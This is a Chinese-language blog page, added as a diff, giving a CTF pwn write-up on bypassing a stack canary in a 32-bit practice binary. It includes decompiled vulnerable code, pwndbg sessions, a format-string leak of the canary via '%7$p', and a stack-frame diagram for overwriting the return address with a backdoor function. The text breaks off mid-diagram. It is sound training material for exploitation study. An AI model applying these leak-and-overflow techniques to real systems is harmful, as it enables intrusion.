@@ -1,0 +1,754 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ningan123">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="01 格式化字符串 (32位程序)checksec查看123456789101112131415161718┌──(root㉿kali)-[~&#x2F;ctf-practice&#x2F;canary&#x2F;01]└─# file binbin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interprete">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【ctf题目系列】pwn类型 canary">
+<meta property="og:url" content="http://example.com/2023/09/04/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91pwn%E7%B1%BB%E5%9E%8B%20canary/index.html">
+<meta property="og:site_name" content="ningan123">
+<meta property="og:description" content="01 格式化字符串 (32位程序)checksec查看123456789101112131415161718┌──(root㉿kali)-[~&#x2F;ctf-practice&#x2F;canary&#x2F;01]└─# file binbin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interprete">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904220846.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221307.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221703.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221849.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904222140.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904222955.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224257.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224636.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904225226.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905112939.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905112639.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905113121.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905113230.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905122100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905122112.png">
+<meta property="article:published_time" content="2023-09-04T22:04:00.000Z">
+<meta property="article:modified_time" content="2023-09-04T23:07:00.000Z">
+<meta property="article:author" content="ningan123">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904220846.png">
+  
+  
+  
+  <title>【ctf题目系列】pwn类型 canary - ningan123</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【ctf题目系列】pwn类型 canary"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-04 22:04" pubdate>
+          2023年9月4日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          84 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【ctf题目系列】pwn类型 canary</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="01-格式化字符串-32位程序"><a href="#01-格式化字符串-32位程序" class="headerlink" title="01 格式化字符串 (32位程序)"></a>01 格式化字符串 (32位程序)</h1><h2 id="checksec查看"><a href="#checksec查看" class="headerlink" title="checksec查看"></a>checksec查看</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctf-practice/canary/01]<br>└─<span class="hljs-comment"># file bin</span><br>bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=01c7b75be8e31b585bf8739665273c91584b826e, not stripped<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/01]<br>└─<span class="hljs-comment"># checksec --file=bin</span><br>[*] <span class="hljs-string">&#x27;/root/ctf-practice/canary/01/bin&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/01]<br>└─<span class="hljs-comment"># ./bin</span><br>%7<span class="hljs-variable">$p</span><br>0xda44e500123456<br><br></code></pre></td></tr></table></figure>
+
+<p>checksec查看发现：32位程序，有canary</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904220846.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="分析漏洞函数"><a href="#分析漏洞函数" class="headerlink" title="分析漏洞函数"></a>分析漏洞函数</h2><p>从ida中查看，分析漏洞函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+6h] [ebp-12h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  init();<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  fun();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现上面的main函数中存在格式化字符串漏洞，可以利用该漏洞泄露出canary的地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>fun函数中，有一个栈溢出的漏洞，可以构造payload进行栈溢出，返回地址填充成什么呢？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *stream; <span class="hljs-comment">// [esp+4h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  stream = fopen(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;get flag error&quot;</span>);<br>  fgets(s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个地方看到有一个后门函数，直接返回到这个函数位置即可~</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221307.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; =============== S U B R O U T I N E =======================================<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; Attributes: bp-based frame<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; unsigned <span class="hljs-type">int</span> getflag()<br>.text:<span class="hljs-number">0804863</span>B                               <span class="hljs-built_in">public</span> getflag<br>.text:<span class="hljs-number">0804863</span>B                               getflag proc near<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               stream= dword ptr <span class="hljs-number">-74</span>h<br>.text:<span class="hljs-number">0804863</span>B                               s= byte ptr <span class="hljs-number">-70</span>h<br>.text:<span class="hljs-number">0804863</span>B                               var_C= dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; __unwind &#123;<br>.text:<span class="hljs-number">0804863</span>B <span class="hljs-number">55</span>                            push    ebp<br></code></pre></td></tr></table></figure>
+
+
+<p>看到后门函数为cat .&#x2F;flag，所以在同级目录下加个一个flag文件，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctf-practice/canary/01]<br>└─<span class="hljs-comment"># cat flag</span><br>flag123<br></code></pre></td></tr></table></figure>
+<h2 id="如何泄露canary地址-如何寻找变量和ebp之间的偏移"><a href="#如何泄露canary地址-如何寻找变量和ebp之间的偏移" class="headerlink" title="如何泄露canary地址 + 如何寻找变量和ebp之间的偏移"></a>如何泄露canary地址 + 如何寻找变量和ebp之间的偏移</h2><p>先分析一下源代码</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># gdb bin</span><br>pwndbg&gt; <span class="hljs-keyword">b </span>main<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">1</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x8048739</span><br>pwndbg&gt; r<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221703.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x804873c</span> &lt;main+<span class="hljs-number">17</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">gs</span>:[<span class="hljs-number">0x14</span>]<br><span class="hljs-number">0x8048742</span> &lt;main+<span class="hljs-number">23</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span> - <span class="hljs-number">0xc</span>], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure>
+
+<p>这两行就是和canary相关的汇编代码</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">pwndbg&gt; <span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure>
+<p>运行完 <code>0x804873c &lt;main+17&gt;    mov    eax, dword ptr gs:[0x14]</code>之后，eax中存入的即为canary的值，为0x888b8f00 (注意，每次运行canary的值都会变)，如下图</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221849.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>运行完<code>0x8048742 &lt;main+23&gt;    mov    dword ptr [ebp - 0xc], eax</code>，canary的值被存入到<code>ebp-0xc</code>的位置，如下图</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904222140.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>为了方便查看，把伪代码再粘贴一份过来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+6h] [ebp-12h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  init();<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  fun();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p><code>__isoc99_scanf(&quot;%6s&quot;, format);</code>  scanf函数有两个参数，我们知道，函数压栈的时候，是从右向左压栈的。</p>
+<p>如下图红框1，可以看到在调用scanf之前，push了两个值，第一个eax([ebp-0x12])是format的地址，第二个0x8048838是”%6s”，所以format在ebp-0x12的位置。EBP位于0xffffd368，所以format在0xffffd356的位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># python</span><br>Python <span class="hljs-number">3.11</span><span class="hljs-number">.4</span> (main, Jun  <span class="hljs-number">7</span> <span class="hljs-number">2023</span>, <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:09) [GCC <span class="hljs-number">12.2</span><span class="hljs-number">.0</span>] on linux<br><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0xffffd368</span> - <span class="hljs-number">0x12</span><br><span class="hljs-number">4294955862</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">4294955862</span>)<br><span class="hljs-string">&#x27;0xffffd356&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>另一种方法，如下图红框2，运行完main+39和main+40之后，栈中最近的两个变量即为scanf的两个参数，所以format在0xffffd356的位置。</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904222955.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>继续运行，输入%p%p%p(因为只能接收6个字符)，直到输出printf</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">pwndbg&gt; n<br><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><br>pwndbg&gt; n<br></code></pre></td></tr></table></figure>
+
+<p>如下图，最上面输出的3个地址，即为printf格式化字符串漏洞泄露的3个地址，从上往下数，canary位于第7个位置。</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224257.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224357.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>再次验证一下<br>退出gdb调试，重新进入，这次输入%7$p</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224603.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>可以看到，输出的地址和canary的地址是一样的<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224636.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224700.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>为了方便查看，我把fun的代码再粘贴一份</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>同样的方式，查找buf变量到ebp的距离，如下图，可以看到buf为<code>ebp-70h</code>的位置</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">pwndbg&gt; b <span class="hljs-function"><span class="hljs-keyword">fun</span></span><br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x80486f9</span><br>pwndbg&gt; r<br>Starting program: /root/ctf-practice/canary/<span class="hljs-number">01</span>/bin<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.<br>%<span class="hljs-number">7</span>$p<br><span class="hljs-number">0x9585b900</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904225226.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>main和fun函数canary到ebp的偏移都是一样的，所以我们从fun函数进行溢出</p>
+<h2 id="栈帧分析"><a href="#栈帧分析" class="headerlink" title="栈帧分析"></a>栈帧分析</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">默认栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+-----------------<br>                                           |<span class="hljs-string">                 </span>|<br>                                0xc        |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">     canary      </span>|<br>                              ebp-0xc ---&gt; +-----------------+<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">     0x70</span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">    </span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                           ebp-0x70 buf---&gt;+-----------------+-----------------<br><br>修改后栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string"> (retaddr) 后门  </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string"> (saved ebp)BBBB </span>|<br>                                    ebp---&gt;+-----------------+-----------------<br>                                           